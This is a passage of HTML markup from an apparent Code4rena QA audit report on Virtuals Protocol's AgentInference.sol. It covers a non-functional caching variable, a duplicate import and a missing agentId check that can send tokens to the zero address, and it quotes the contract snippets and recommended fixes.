href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-840\"\u003eAnyasaa\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-629\"\u003eBlackAdam\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-266\"\u003ecerweb10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-805\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-219\"\u003ecodexNature\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-751\"\u003eDanielTan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-675\"\u003eDanielTan_MetaTrust\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-71\"\u003eFavourOkerri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-405\"\u003efrancoHacker\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-788\"\u003egeraldwenzel\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-850\"\u003egkrastenov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-837\"\u003ejeffy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-170\"\u003ejoicygiore\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-792\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-746\"\u003eLeoGold\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-615\"\u003eLhoussainePh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-410\"\u003enatachi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-600\"\u003enewspacexyz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-851\"\u003eNexarion\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-699\"\u003ePelz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-684\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-436\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-21\"\u003eRice_T\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-616\"\u003eRoger\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-227\"\u003esafie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-65\"\u003eShinobi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-789\"\u003eSilverwind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-571\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-25\"\u003esungjun0208\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-213\"\u003etacitvs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-319\"\u003eTheCarrot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-761\"\u003eunique\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-59\"\u003ezhanmingjing\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-599\"\u003ezubyoz\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues deemed invalid by the judge have been omitted from this report.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"01-missing-update-of-prevagentid-in-promptmulti\" style=\"position:relative;\"\u003e\u003ca href=\"#01-missing-update-of-prevagentid-in-promptmulti\" aria-label=\"01 missing update of prevagentid in promptmulti permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Missing update of \u003ccode\u003eprevAgentId\u003c/code\u003e in \u003ccode\u003epromptMulti\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003epromptMulti\u003c/code\u003e function in \u003ccode\u003eAgentInference.sol\u003c/code\u003e is intended to optimize repeated calls to \u003ccode\u003eagentNft.virtualInfo(agentId).tba\u003c/code\u003e by caching the previous \u003ccode\u003eagentId\u003c/code\u003e and its corresponding TBA address. However, the variable \u003ccode\u003eprevAgentId\u003c/code\u003e is never updated within the loop. As a result, the optimization is non-functional: for each iteration, the contract will call \u003ccode\u003eagentNft.virtualInfo(agentId).tba\u003c/code\u003e whenever the current \u003ccode\u003eagentId\u003c/code\u003e is not zero, regardless of whether the agent ID has changed from the previous iteration. This leads to unnecessary repeated external calls, increasing gas costs and reducing efficiency.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L80-L91\"\u003eAgentInference.sol#L80-L91\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einferenceCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ePrompt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epromptHashes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate \u003ccode\u003eprevAgentId\u003c/code\u003e to the current \u003ccode\u003eagentId\u003c/code\u003e after fetching a new TBA address within the loop. This ensures that the optimization works as intended and redundant calls are avoided.\u003c/p\u003e\n\u003ch2 id=\"02-duplicate-import-statement-for-mathsol\" style=\"position:relative;\"\u003e\u003ca href=\"#02-duplicate-import-statement-for-mathsol\" aria-label=\"02 duplicate import statement for mathsol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Duplicate import statement for \u003ccode\u003eMath.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eIn \u003ccode\u003eAgentInference.sol\u003c/code\u003e, the \u003ccode\u003e@openzeppelin/contracts/utils/math/Math.sol\u003c/code\u003e library is imported twice at the top of the file. This duplication is unnecessary and could lead to confusion for maintainers or reviewers. While it does not directly impact contract functionality or security, it is a code quality issue that can be easily avoided.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L6-L10\"\u003eAgentInference.sol#L6-L10\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;@openzeppelin/contracts/utils/math/Math.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 5\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// ... other imports\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;@openzeppelin/contracts/utils/math/Math.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 8 - duplicated import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the redundant import statement so that \u003ccode\u003eMath.sol\u003c/code\u003e is imported only once at the top of the contract file.\u003c/p\u003e\n\u003ch2 id=\"03-invalid-agentid-leads-to-token-burning\" style=\"position:relative;\"\u003e\u003ca href=\"#03-invalid-agentid-leads-to-token-burning\" aria-label=\"03 invalid agentid leads to token burning permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Invalid \u003ccode\u003eagentId\u003c/code\u003e leads to token burning\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eprompt\u003c/code\u003e and \u003ccode\u003epromptMulti\u003c/code\u003e functions in \u003ccode\u003eAgentInference.sol\u003c/code\u003e do not validate if an \u003ccode\u003eagentId\u003c/code\u003e exists in the \u003ccode\u003eagentNft\u003c/code\u003e contract before transferring tokens. If an invalid \u003ccode\u003eagentId\u003c/code\u003e is provided, \u003ccode\u003eagentNft.virtualInfo(agentId).tba\u003c/code\u003e will return \u003ccode\u003eaddress(0)\u003c/code\u003e (the zero address), causing tokens to be sent to this address. Sending tokens to the zero address effectively burns them, resulting in permanent loss of funds.\u003c/p\u003e\n\u003cp\u003eThis issue can occur through user error (e.g., providing an incorrect agent ID) or potentially through malicious inputs in a front-end interface. The impact is severe as users have no way to recover tokens sent to the zero address.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L52-L55\"\u003eAgentInference.sol#L52-L55\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In prompt() function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L82-L87\"\u003eAgentInference.sol#L82-L87\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In promptMulti() function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 